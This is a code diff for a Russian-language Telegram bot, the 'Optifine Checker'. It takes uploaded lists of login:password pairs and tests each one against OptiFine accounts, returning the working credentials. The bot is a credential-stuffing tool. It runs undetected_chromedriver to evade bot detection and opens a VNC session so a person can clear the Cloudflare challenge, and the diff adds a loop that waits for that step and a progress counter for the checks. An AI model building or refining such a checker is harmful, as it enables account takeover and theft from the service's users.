@@ -72,6 +72,7 @@ class OptifineChecker:
                     return True
             except:
                 pass
+            logger.info(f"⏳ Ожидание Xvfb... {i+1}/10")
             time.sleep(2)
         return False
 
@@ -101,6 +102,8 @@ class OptifineChecker:
             options.add_argument('--lang=en-US,en;q=0.9')
             options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
             
+            logger.info(f"🚀 Запускаю undetected_chromedriver...")
+            
             self.driver = uc.Chrome(
                 options=options,
                 version_main=int(chrome_version),
@@ -120,17 +123,19 @@ class OptifineChecker:
         """Получает публичный URL от Railway"""
         try:
             # Railway автоматически создает URL для порта 5900
-            # Пробуем получить из переменных окружения
             railway_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
             if railway_url:
                 return f"https://{railway_url}:5900"
             
             # Если нет, пробуем через метаданные
-            import requests
-            metadata = requests.get('http://metadata.railway.internal/').json()
-            hostname = metadata.get('hostname')
-            if hostname:
-                return f"https://{hostname}.railway.app:5900"
+            try:
+                import requests
+                metadata = requests.get('http://metadata.railway.internal/', timeout=5).json()
+                hostname = metadata.get('hostname')
+                if hostname:
+                    return f"https://{hostname}.railway.app:5900"
+            except:
+                pass
             
             return None
         except:
@@ -146,7 +151,31 @@ class OptifineChecker:
             
             if not web_url:
                 # Если не получилось, показываем инструкцию
-                web_url = "НУЖНО ДОБАВИТЬ ПОРТ 5900 В RAILWAY"
+                instruction = (
+                    f"🖥️ **НАСТРОЙКА ДОСТУПА**\n\n"
+                    f"1️⃣ Зайди в **Railway Dashboard**\n"
+                    f"2️⃣ Открой **Settings → Networking**\n"
+                    f"3️⃣ Добавь порт **5900** (TCP)\n"
+                    f"4️⃣ Скопируй публичный адрес\n\n"
+                    f"5️⃣ Открой в браузере:\n"
+                    f"`https://ТВОЙ_АДРЕС.railway.app:5900/vnc.html`\n\n"
+                    f"6️⃣ Нажми **Connect**\n"
+                    f"7️⃣ Нажми галочку\n"
+                    f"8️⃣ Вернись и нажми кнопку"
+                )
+            else:
+                instruction = (
+                    f"🖥️ **БРАУЗЕР ЗАПУЩЕН**\n\n"
+                    f"🔗 **ТВОЯ ССЫЛКА:**\n"
+                    f"`{web_url}/vnc.html`\n\n"
+                    f"📱 **ЧТО ДЕЛАТЬ:**\n"
+                    f"1️⃣ Открой эту ссылку в браузере на телефоне\n"
+                    f"2️⃣ Нажми кнопку **Connect**\n"
+                    f"3️⃣ Ты увидишь рабочий стол с браузером\n"
+                    f"4️⃣ **Нажми на галочку** на странице\n"
+                    f"5️⃣ Вернись сюда и нажми кнопку\n\n"
+                    f"⏳ **Время ожидания: 5 минут**"
+                )
             
             keyboard = [
                 [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"web_done_{session_id}")],
@@ -163,19 +192,7 @@ class OptifineChecker:
             self.driver.save_screenshot('/app/debug/initial_page.png')
             
             # Отправляем инструкцию
-            await update.message.reply_text(
-                f"🖥️ **БРАУЗЕР ЗАПУЩЕН**\n\n"
-                f"🔗 **ТВОЯ ССЫЛКА ДЛЯ ДОСТУПА:**\n"
-                f"`{web_url}/vnc.html`\n\n"
-                f"📱 **ЧТО ДЕЛАТЬ:**\n"
-                f"1️⃣ Открой эту ссылку в браузере на телефоне\n"
-                f"2️⃣ Нажми кнопку **Connect**\n"
-                f"3️⃣ Ты увидишь рабочий стол с браузером\n"
-                f"4️⃣ Нажми на галочку на странице\n"
-                f"5️⃣ Вернись сюда и нажми кнопку\n\n"
-                f"⏳ **Время ожидания: 5 минут**",
-                reply_markup=reply_markup
-            )
+            await update.message.reply_text(instruction, reply_markup=reply_markup)
             
             # Сохраняем сессию
             pending_sessions[session_id] = {
@@ -244,12 +261,13 @@ class OptifineChecker:
             if session['checker'].check_cloudflare_status():
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Cloudflare пройден!** Продолжаю проверку...")
+                return True
             else:
                 await query.edit_message_text(
                     "❌ **Cloudflare все еще активен**\n\n"
                     "Посмотри в браузере:\n"
-                    "• Точно ли ты нажал на галочку?\n"
-                    "• Попробуй еще раз"
+                    "• Видишь ли галочку?\n"
+                    "• Нажми на неё и попробуй снова"
                 )
         
         elif action == 'status':
@@ -377,17 +395,32 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         files = os.listdir('/app/debug')
-        if files:
-            for file in files[:5]:
-                file_path = os.path.join('/app/debug', file)
-                with open(file_path, 'rb') as f:
-                    await update.message.reply_document(f, filename=file)
-        else:
+        if not files:
             await update.message.reply_text("📁 Папка debug пуста")
+            return
+        
+        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
+        
+        sent = 0
+        for file in files[:5]:
+            file_path = os.path.join('/app/debug', file)
+            if os.path.getsize(file_path) > 10 * 1024 * 1024:
+                continue
+            with open(file_path, 'rb') as f:
+                await update.message.reply_document(
+                    document=f,
+                    filename=file,
+                    caption=f"📁 **Debug:** `{file}`"
+                )
+            sent += 1
+            await asyncio.sleep(1)
+        
+        await update.message.reply_text(f"✅ Отправлено файлов: {sent}")
+        
     except Exception as e:
         await update.message.reply_text(f"❌ Ошибка: {e}")
 
-async function process_file(file_path, update, context):
+async def process_file(file_path, update, context):
     """Обработка файла"""
     checker = OptifineChecker()
     results = {'valid': [], 'invalid': []}
@@ -395,21 +428,26 @@ async function process_file(file_path, update, context):
     msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
     
     try:
+        # Читаем файл
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
             content = await f.read()
         
+        # Парсим аккаунты
         accounts = []
         for line in content.strip().split('\n'):
+            line = line.strip()
             if ':' in line:
                 login, password = line.split(':', 1)
                 accounts.append((login.strip(), password.strip()))
         
-        if not accounts:
+        total = len(accounts)
+        if total == 0:
             await msg.edit_text("❌ **Нет аккаунтов**")
             return
         
-        await msg.edit_text(f"📊 Аккаунтов: {len(accounts)}\n\n🖥️ **Запускаю браузер...**")
+        await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🖥️ **Запускаю браузер...**")
         
+        # Инициализация
         if not checker.init_driver():
             await msg.edit_text("❌ **Ошибка инициализации**")
             return
@@ -420,19 +458,42 @@ async function process_file(file_path, update, context):
             checker.close()
             return
         
-        await msg.edit_text("⏳ **Ожидаю прохождения Cloudflare...**\n\nПерейди по ссылке и нажми галочку")
+        await msg.edit_text(f"⏳ **Ожидаю прохождения Cloudflare...**\n\nПерейди по ссылке и нажми галочку")
+        
+        # Ждем прохождения Cloudflare
+        cloudflare_timeout = 300
+        start_wait = time.time()
+        
+        while time.time() - start_wait < cloudflare_timeout:
+            if checker.cloudflare_passed or checker.check_cloudflare_status():
+                break
+            await asyncio.sleep(2)
+        
+        if not checker.cloudflare_passed and not checker.check_cloudflare_status():
+            await msg.edit_text("❌ **Cloudflare не пройден**\n\nПопробуй еще раз")
+            checker.close()
+            return
+        
+        await msg.edit_text(f"✅ **Cloudflare пройден!**\n\nНачинаю проверку {total} аккаунтов...")
         
         # Проверка аккаунтов
+        valid_count = 0
         for i, (login, password) in enumerate(accounts, 1):
+            if i % 3 == 0:
+                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {valid_count}")
+            
             result = await checker.check_account(login, password)
+            
             if result['status'] == 'valid':
                 results['valid'].append(result)
+                valid_count += 1
                 bot_stats['valid'] += 1
             else:
                 results['invalid'].append(result)
                 bot_stats['invalid'] += 1
             
             bot_stats['total'] += 1
+            await asyncio.sleep(2)
         
         # Отправка результатов
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -443,24 +504,28 @@ async function process_file(file_path, update, context):
                 for acc in results['valid']:
                     await f.write(f"{acc['login']}:{acc['password']}\n")
             with open(valid_file, 'rb') as f:
-                await update.message.reply_document(f, filename=valid_file)
+                await update.message.reply_document(
+                    document=f,
+                    filename=valid_file,
+                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
+                )
             os.remove(valid_file)
         
         await update.message.reply_text(
-            f"✅ **ГОТОВО!**\n\n"
-            f"Всего: {len(accounts)}\n"
+            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
+            f"📊 Всего: {total}\n"
             f"✅ Рабочих: {len(results['valid'])}"
         )
         
     except Exception as e:
         logger.error(f"Ошибка: {e}")
-        await update.message.reply_text(f"❌ Ошибка: {e}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
     finally:
         checker.close()
         if os.path.exists(file_path):
             os.remove(file_path)
 
-async function handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Получение файла"""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
         await update.message.reply_text("❌ **Нет доступа**")
@@ -471,29 +536,47 @@ async function handle_document(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
-    file = await context.bot.get_file(doc.file_id)
-    path = f"temp_{update.effective_user.id}_{doc.file_name}"
-    await file.download_to_drive(path)
-    await process_file(path, update, context)
+    if doc.file_size > 10 * 1024 * 1024:
+        await update.message.reply_text("❌ **Файл слишком большой (>10MB)**")
+        return
+    
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        path = f"temp_{update.effective_user.id}_{doc.file_name}"
+        await file.download_to_drive(path)
+        await process_file(path, update, context)
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
+        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
 
-async function button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка кнопок"""
     checker = OptifineChecker()
     await checker.handle_callback(update, context)
 
 def main():
+    """Запуск"""
     print("=" * 50)
     print("🚀 ЗАПУСК OPTIFINE CHECKER")
     print("=" * 50)
+    print(f"📁 Директория отладки: /app/debug")
+    print(f"👑 Admin IDs: {ADMIN_IDS}")
+    print("=" * 50)
     
     app = Application.builder().token(TOKEN).build()
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("debug", debug_command))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     print("✅ БОТ ЗАПУЩЕН!")
-    app.run_polling()
+    print("=" * 50)
+    
+    try:
+        app.run_polling()
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
 
 if __name__ == '__main__':
     main()
